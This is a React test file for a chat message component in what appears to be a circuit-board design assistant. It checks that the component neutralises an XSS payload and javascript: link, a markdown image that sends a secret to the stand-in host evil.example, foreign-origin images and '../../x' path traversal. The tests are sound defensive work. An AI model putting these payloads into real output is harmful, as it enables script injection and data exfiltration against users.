import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { PID, row } from '@/test/fakeMessageServer';
import { MessageItem, imageUrls, withoutDuplicateToolImages } from './MessageItem';

const img = (name: string) => `/api/projects/${PID}/images/${name}`;

describe('MessageItem', () => {
  it('renders assistant markdown and does not render raw HTML or javascript: links', () => {
    const { container } = render(
      <MessageItem message={row(1, { content: '**bold** <img src=x onerror=alert(1)> [x](javascript:alert(1))' })} />,
    );
    expect(screen.getByText('bold').tagName).toBe('STRONG');
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByText('x').closest('a');
    expect(link?.getAttribute('href') ?? '').not.toMatch(/^javascript:/);
  });

  it('renders user text verbatim with a sending hint while optimistic', () => {
    render(<MessageItem message={row(-1, { role: 'user', content: '**not md**', status: 'queued', metadata: { pending: true } })} />);
    expect(screen.getByText('**not md**')).toBeInTheDocument();
    expect(screen.getByText('sending…')).toBeInTheDocument();
  });

  it('shows why a user message was not sent', () => {
    render(<MessageItem message={row(-2, { role: 'user', content: 'hi', status: 'error', metadata: { pending: true, error: 'offline' } })} />);
    expect(screen.getByText('not sent: offline')).toBeInTheDocument();
    expect(screen.queryByText('sending…')).toBeNull();
  });

  it('thinking is collapsed by default', () => {
    render(<MessageItem message={row(2, { kind: 'thinking', content: 'pondering' })} />);
    const details = screen.getByText('Thinking').closest('details');
    expect(details).not.toHaveAttribute('open');
  });

  it('tool_use shows the tool name and reveals input on expand', () => {
    render(<MessageItem message={row(3, { kind: 'tool_use', content: 'pcb_get_footprint', metadata: { toolUseId: 't1', name: 'pcb_get_footprint', input: { ref: 'R12' } } })} />);
    const summary = screen.getByText(/pcb_get_footprint/);
    expect(summary.closest('details')).not.toHaveAttribute('open');
    fireEvent.click(summary);
    expect(screen.getByText(/"ref": "R12"/)).toBeInTheDocument();
  });

  it('tool_result error is flagged', () => {
    render(<MessageItem message={row(4, { kind: 'tool_result', content: 'no such ref', metadata: { toolUseId: 't1', isError: true, images: [] } })} />);
    expect(screen.getByText('Tool error')).toBeInTheDocument();
  });

  it('tool_result image thumbnails open a lightbox that Escape closes', () => {
    render(<MessageItem message={row(4, { kind: 'tool_result', content: 'rendered', metadata: { toolUseId: 't1', isError: false, images: [{ url: img('a.png') }, 'https://evil.example/x.png'] } })} />);
    const thumbs = screen.getAllByRole('button', { name: /Open image/ });
    expect(thumbs).toHaveLength(1);
    fireEvent.click(thumbs[0]!);
    expect(screen.getByRole('dialog')).toBeInTheDocument();
    fireEvent.keyDown(document, { key: 'Escape' });
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('renders error rows generically (any metadata.code) and notices', () => {
    render(<>
      <MessageItem message={row(5, { kind: 'error', content: 'KiCad API server restarted', metadata: { code: 'kicad_unavailable' } })} />
      <MessageItem message={row(6, { kind: 'error', content: 'Agent backend failed', metadata: { code: 'agent_unavailable' } })} />
      <MessageItem message={row(7, { kind: 'error', content: 'Something new', metadata: { code: 'brand_new_code' } })} />
      <MessageItem message={row(8, { kind: 'notice', role: 'system', content: 'Files changed outside CopperChat' })} />
    </>);
    const alerts = screen.getAllByRole('alert');
    expect(alerts.map((a) => a.textContent)).toEqual(['KiCad API server restarted', 'Agent backend failed', 'Something new']);
    expect(screen.getByText('Files changed outside CopperChat')).toBeInTheDocument();
  });

  it('imageUrls collects url and images and filters foreign origins', () => {
    expect(imageUrls(row(7, { kind: 'image', metadata: { url: img('a.png'), images: [img('b.png'), { url: 'http://x/c.png' }, '//evil/d.png'] } })))
      .toEqual([img('a.png'), img('b.png')]);
  });
});

describe('withoutDuplicateToolImages', () => {
  it('drops image rows already shown as thumbnails of their loaded tool_result', () => {
    const result = row(10, { kind: 'tool_result', content: 'ok', metadata: { toolUseId: 't1', isError: false, images: [{ url: img('a.png') }] } });
    const dup = row(11, { kind: 'image', content: '', metadata: { toolUseId: 't1', url: img('a.png') } });
    const orphan = row(12, { kind: 'image', content: '', metadata: { toolUseId: 't0', url: img('z.png') } });
    const user = row(13, { kind: 'image', role: 'user', content: '', metadata: { url: img('u.png') } });
    expect(withoutDuplicateToolImages([result, dup, orphan, user]).map((m) => m.id)).toEqual([10, 12, 13]);
  });
});

describe('Markdown images', () => {
  it('never loads an external image from agent text (exfiltration via URL)', () => {
    const m = row(90, { role: 'assistant', kind: 'text', content: 'x ![leak](https://evil.example/p.png?d=secret) y' });
    const { container } = render(<MessageItem message={m} />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(/\[image: leak\]/)).toBeTruthy();
  });

  it('renders same-origin API images', () => {
    const m = row(91, { role: 'assistant', kind: 'text', content: `![v](/api/projects/${PID}/images/a.png)` });
    const { container } = render(<MessageItem message={m} />);
    expect(container.querySelector('img')?.getAttribute('src')).toBe(`/api/projects/${PID}/images/a.png`);
  });

  it.each([
    ['another API GET (uncached agent-view render)', `/api/projects/${PID}/agent-view?doc=pcb`],
    ['an API path outside the image endpoints', '/api/auth/me'],
    ['a dot segment', `/api/projects/${PID}/images/..`],
    ['a blob url', 'blob:http://localhost/abc'],
  ])('shows a placeholder for %s', (_label, url) => {
    const m = row(92, { role: 'assistant', kind: 'text', content: `![v](${url})` });
    const { container } = render(<MessageItem message={m} />);
    expect(container.querySelector('img')).toBeNull();
  });

  it('renders stored agent renders', () => {
    const m = row(93, { role: 'assistant', kind: 'text', content: `![r](/api/projects/${PID}/renders/pcb-top.png)` });
    const { container } = render(<MessageItem message={m} />);
    expect(container.querySelector('img')?.getAttribute('src')).toBe(`/api/projects/${PID}/renders/pcb-top.png`);
  });
});

describe('MessageItem sent attachments', () => {
  it('shows image thumbnails and PDF chips on user rows, dropping invalid ids', () => {
    const id = 'f'.repeat(32);
    const { container } = render(
      <MessageItem
        message={row(10, {
          role: 'user',
          content: 'look',
          metadata: {
            attachments: [
              { id, kind: 'image', name: 'board.jpg' },
              { id: '0'.repeat(32), kind: 'pdf', name: 'ds.pdf' },
              { id: '../../x', kind: 'image', name: 'evil.png' },
            ],
          },
        })}
      />,
    );
    expect(screen.getByText('board.jpg')).toBeInTheDocument();
    expect(screen.getByText('ds.pdf')).toBeInTheDocument();
    expect(screen.getByText('PDF')).toBeInTheDocument();
    expect(screen.queryByText('evil.png')).toBeNull();
    const imgs = container.querySelectorAll('img');
    expect(imgs).toHaveLength(1);
    expect(imgs[0]).toHaveAttribute('src', `/api/projects/${PID}/uploads/${id}`);
  });
});
